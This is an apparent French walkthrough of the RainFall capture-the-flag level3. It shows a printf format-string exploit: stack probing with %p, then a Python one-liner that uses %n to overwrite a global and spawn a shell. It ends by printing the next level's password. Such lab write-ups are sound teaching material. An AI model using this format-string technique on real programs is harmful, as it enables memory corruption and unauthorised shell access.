Le programme utilise fgets, il est impossible de provoquer un buffer overflow, mais nous pouvons utiliser une format string attack avec printf. Une attaque par chaîne de format avec printf en C exploite des vulnérabilités où l'entrée utilisateur est utilisée par erreur comme paramètre de la chaîne de format, permettant à un attaquant de lire ou d'écrire en mémoire. Pour le tester, nous pouvons essayer d'ajouter %p à notre entrée. Nous avons également remarqué qu'une variable `m` a été déclarée, `m` est copiée dans `eax` puis comparée pour entrer dans la condition.

```
0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>```

```
Starting program: /home/user/level3/level3 
AAAA %p %p %p %p %p %p %p 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070
```

Nous pouvons voir nos 4 A à la quatrième position, ce qui signifie que la variable `m` peut être écrasée 64 - 4 = 60 octets plus loin.

Pour écraser eax, passer la condition et exécuter system("/bin/sh"), nous devons spécifier l'adresse de `m`, puis ajouter les 60 octets et enfin utiliser `%n` pour écrire 4 octets à l'adresse de `m`.

```(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3```

```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
